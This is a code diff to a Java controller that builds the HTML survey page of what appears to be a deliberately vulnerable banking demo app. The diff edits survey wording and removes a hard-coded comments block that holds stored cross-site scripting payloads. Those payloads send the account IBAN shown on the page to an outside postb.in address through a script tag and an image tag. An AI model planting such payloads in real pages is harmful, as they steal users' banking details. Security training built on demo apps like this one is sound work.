@@ -52,10 +52,10 @@ public class ControllerSurvey extends ControllerParent {
 								+ "		<div class='container' style='margin:20px 20px 20px 20px;text-align:left'>"
 								+ "		<h1 style='color:#ef2633'>DIBA Survey</h1>"
 								+ "		<p style='border:1px solid #666;padding:5px;border-radius:3px;width:100%;'>"
-								+ "         You recently open account IBAN:</br> <a id='iban'>CH48123456789</a>"
+								+ "         You recently opened account IBAN:</br> <a id='iban'>CH48123456789</a>"
 								+ "     </p>"
 								+ "		<div style='width:100%;'>"
-								+ "		    <label for='score'>Please, let us know you think. Give us a comment and score our service from 1 (bad) to 5 (good):</label>"
+								+ "		    <label for='score'>Please let us know what you think - provide a comment and a score from 1 (bad) to 5 (very good).</label>"
 								+ "			<select name='service' id='score' style='width:100%;margin-top:10px;padding:5px;font-family:inherit;font-size:inherit'>"
 								+ "			  <option value='1'>1</option>"
 								+ "			  <option value='2'>2</option>" 
@@ -66,28 +66,16 @@ public class ControllerSurvey extends ControllerParent {
 								+ "			<textarea id='comment' style='margin-top:30px;width:100%;height:125px;font-family:inherit;font-size:inherit;' name='comment' form='commentForm' type='text' placeholder='Insert your comment here...'></textarea></br>"
 								+ "         <button onclick='post_comment()' style='margin-top:10px;float:right;padding:10px;color:white;background-color:#2196f3;border:none;border-radius:5px;cursor:pointer;font-size:12pt;'>POST COMMENT</button>"
 								+ "		</div>"
-								+ "		<!-- comments from other users -->";
+								+ "		<!-- comments from other users -->"
+	                            + "     <div id='comments' style='display:inline-block;text-align:left;'>"
+					            + "        <h3>Comments:</h3>"
+			                    + "        <div style='padding:5px;'><div style='border:1px solid black;margin:5px;padding:5px;width:300px;border-radius:3px;word-wrap:break-word;'><div style='border-bottom:1px solid #adadad;margin-bottom:10px;'>10-09-2020<div style='float:right'>Score:5</div></div>Very good service, thank you!</div></div>"
+			                    + "        <div style='padding:5px;'><div style='border:1px solid black;margin:5px;padding:5px;width:300px;border-radius:3px;word-wrap:break-word;'><div style='border-bottom:1px solid #adadad;margin-bottom:10px;'>10-09-2020<div style='float:right'>Score:3</div></div>It's OK, but I have seen better apps.</div></div>"
+			                    + "        <div style='padding:5px;'><div style='border:1px solid black;margin:5px;padding:5px;width:300px;border-radius:3px;word-wrap:break-word;'><div style='border-bottom:1px solid #adadad;margin-bottom:10px;'>10-09-2020<div style='float:right'>Score:2</div></div>Not happy, I am thinking about using another bank.</div></div>";
 
-
-	private static String html2 = " <div id='comments' style='display:inline-block;text-align:left;'>"
-								+ "			<h3>Comments:</h3>"
-								+ "			<div style='border:1px solid black;margin:5px;padding:3px;width:300px;'>This app is awesome! :D</div>"
-								+ "			<div style='border:1px solid black;margin:5px;padding:3px;width:300px;'>Thank you! I won the prize :D</div>"
-								+ "			<div style='border:1px solid black;margin:5px;padding:3px;width:300px;'>This app is awesome! :D</div>"
-								+ "	<div style='border:1px solid black;margin:5px;padding:3px;width:300px;'>AHAHA I have your IBAN :D<script>new Image().src = encodeURI(\"https://postb.in/1593853304607-7301555383019?iban=\"+document.getElementById(\"iban\").text);</script>"
-								+ "			</div>"
-								+ "	<div style='border:1px solid black;margin:5px;padding:3px;width:300px;'>WHHHHHHU Thank you! I won the prize :D"
-								+ "         <img src='https://postb.in/1594074379438-2416828356217?iban='+document.getElementById(\"iban\").text/>"
-								+ "		    </div>"
-								+ "	</div>"
-								+ "	</div>"
-								+ "	</body>"
-								+ "</html>";
 
 	public static String buildHtml(ArrayList<Comment> comments) {
 		String surveyHtml = html1;
-		surveyHtml += "<div id='comments' style='display:inline-block;text-align:left;'>"
-					+ "<h3>Comments:</h3>";
 		DateFormat dateFormat = new SimpleDateFormat("dd-MM-yyyy");
 		String today = dateFormat.format(Calendar.getInstance().getTime());
 		for (int i=0; i<comments.size(); i++) {
